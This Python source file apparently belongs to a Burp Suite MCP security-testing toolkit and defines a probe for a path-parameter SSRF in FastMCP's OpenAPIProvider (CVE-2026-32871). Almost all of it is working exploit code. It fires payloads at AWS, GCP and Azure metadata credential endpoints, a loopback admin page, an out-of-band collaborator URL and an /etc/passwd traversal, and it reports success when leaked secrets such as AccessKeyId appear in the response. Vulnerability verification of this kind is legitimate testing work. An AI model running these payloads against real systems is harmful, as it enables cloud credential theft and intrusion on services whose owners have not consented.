"""probe_fastmcp_openapi_ssrf — CVE-2026-32871.

FastMCP OpenAPIProvider exposes an OpenAPI-described HTTP backend through
MCP tool calls. Path parameters from the MCP tool/call land in the backend
URL without SSRF guard — operator-controlled MCP input → server-side fetch
to attacker-chosen target.

Strategy:
  1. Enumerate tools via MCP tools/list (or accept tool_name parameter).
  2. Identify path-template tools (input schema property names match path
     placeholders like {id} or {path}).
  3. Inject canary payloads:
       - `..%2F..%2F` path traversal — verify the OpenAPI router builds a
         backend URL containing the traversal sequence.
       - `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
         — raw URL in path-param.
       - Collaborator subdomain — OOB proof.

CONFIRMED on:
  - IMDS marker (`ami-id`, `AccessKeyId`, `iam`) in response body.
  - Collaborator HTTP/DNS interaction.
SUSPECTED on unexpected status (502/504 from backend resolving attacker URL).

Returns VerdictResult.
"""

from __future__ import annotations

import json

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


_IMDS_MARKERS = (
    "ami-id", "instance-id", "AccessKeyId", "SecretAccessKey",
    "iam/security-credentials", "computeMetadata", "Metadata-Flavor",
    "instance/service-accounts", "ManagedIdentityCredential",
)

_SSRF_TARGETS = [
    ("aws_imds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("gcp_meta", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("azure_imds", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("loopback_admin", "http://127.0.0.1/admin"),
]

_PATH_TRAVERSAL = "..%2F..%2F..%2Fetc%2Fpasswd"


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_fastmcp_openapi_ssrf(
        mcp_endpoint_url: str,
        tool_name: str,
        path_param_name: str,
        bearer_token: str = "",
        collaborator_payload: str = "",
        timeout: int = 20,
    ) -> dict:
        """Probe a FastMCP OpenAPIProvider tool for path-param SSRF (CVE-2026-32871).

        Fires the named tool via MCP tools/call with SSRF payloads in the
        specified path parameter. CONFIRMED on IMDS marker echo or
        Collaborator interaction.

        Args:
            mcp_endpoint_url: MCP JSON-RPC endpoint URL.
            tool_name: name of the OpenAPIProvider-backed tool to invoke.
            path_param_name: input-schema property that maps to a URL
                path-template placeholder.
            bearer_token: optional auth.
            collaborator_payload: Collaborator subdomain for OOB proof
                (call generate_collaborator_payload first; do NOT fabricate).
            timeout: per-request timeout (s).

        Returns: VerdictResult.
        """
        if not mcp_endpoint_url or not tool_name or not path_param_name:
            return error_verdict(
                "mcp_endpoint_url, tool_name, path_param_name all required",
                vuln_type="fastmcp_openapi_ssrf",
            )

        logger_indices: list[int] = []
        reproductions: list[dict] = []
        confirmed_hits: list[dict] = []
        suspected_hits: list[dict] = []

        # In-band SSRF targets
        for label, target in _SSRF_TARGETS:
            entry = await _call_tool(
                mcp_endpoint_url, tool_name,
                {path_param_name: target},
                bearer_token, timeout,
            )
            entry["variant"] = label
            reproductions.append(entry)
            li = entry.get("logger_index", -1)
            if isinstance(li, int) and li >= 0:
                logger_indices.append(li)

            body = entry.get("response_body", "") or ""
            if any(m in body for m in _IMDS_MARKERS):
                entry["matched"] = "imds_marker_echo"
                confirmed_hits.append(entry)
            elif entry.get("status_code") in (502, 504, 500) and "fetch" not in body.lower():
                entry["matched"] = "backend_fetch_error"
                suspected_hits.append(entry)

        # Path traversal canary
        trav_entry = await _call_tool(
            mcp_endpoint_url, tool_name,
            {path_param_name: _PATH_TRAVERSAL},
            bearer_token, timeout,
        )
        trav_entry["variant"] = "path_traversal"
        reproductions.append(trav_entry)
        li = trav_entry.get("logger_index", -1)
        if isinstance(li, int) and li >= 0:
            logger_indices.append(li)
        body = trav_entry.get("response_body", "") or ""
        if "root:" in body and ":/bin/" in body:
            trav_entry["matched"] = "etc_passwd_echo"
            confirmed_hits.append(trav_entry)

        # Collaborator OOB
        collab_interactions: list[str] = []
        if collaborator_payload:
            collab_url = f"http://{collaborator_payload}/fastmcp-probe"
            collab_entry = await _call_tool(
                mcp_endpoint_url, tool_name,
                {path_param_name: collab_url},
                bearer_token, timeout,
            )
            collab_entry["variant"] = "collaborator_oob"
            reproductions.append(collab_entry)
            li = collab_entry.get("logger_index", -1)
            if isinstance(li, int) and li >= 0:
                logger_indices.append(li)
            collab_interactions.append(collaborator_payload)
            # Caller should poll Collaborator separately; we flag the variant
            # so the operator knows to poll.

        if confirmed_hits:
            first = confirmed_hits[0]
            return make_verdict(
                "CONFIRMED", 0.94,
                f"FastMCP OpenAPIProvider SSRF via path-param `{path_param_name}` "
                f"on tool `{tool_name}` — {first.get('matched')} "
                f"({len(confirmed_hits)} confirmed variants)",
                vuln_type="fastmcp_openapi_ssrf",
                logger_indices=logger_indices,
                reproductions=reproductions,
                collaborator_interactions=collab_interactions,
                details={"confirmed_count": len(confirmed_hits),
                         "first_hit": first,
                         "cve": "CVE-2026-32871"},
                summary=f"CONFIRMED FastMCP path-param SSRF on tool {tool_name}",
            )

        if suspected_hits or collaborator_payload:
            return make_verdict(
                "SUSPECTED", 0.55,
                f"Backend fetch sensitivity on tool `{tool_name}` "
                f"({len(suspected_hits)} suspicious responses). "
                + ("Collaborator probe fired — poll separately to confirm OOB."
                   if collaborator_payload else "Manual review."),
                vuln_type="fastmcp_openapi_ssrf",
                logger_indices=logger_indices,
                reproductions=reproductions,
                collaborator_interactions=collab_interactions,
                details={"suspected_count": len(suspected_hits)},
                summary=f"SUSPECTED FastMCP backend sensitivity on tool {tool_name}",
            )

        return make_verdict(
            "FAILED", 0.10,
            f"No SSRF signal across {len(reproductions)} path-param variants",
            vuln_type="fastmcp_openapi_ssrf",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary=f"FAILED — no FastMCP SSRF on tool {tool_name}",
        )


async def _call_tool(
    endpoint: str, tool_name: str, arguments: dict,
    bearer_token: str, timeout: int,
) -> dict:
    headers = {"Content-Type": "application/json",
               "Accept": "application/json, text/event-stream"}
    if bearer_token:
        headers["Authorization"] = f"Bearer {bearer_token}"
    body = {
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": {"name": tool_name, "arguments": arguments},
    }
    return await client.post("/api/http/curl", json={
        "method": "POST", "url": endpoint,
        "json_body": body, "headers": headers,
        "follow_redirects": False, "timeout": timeout,
    })
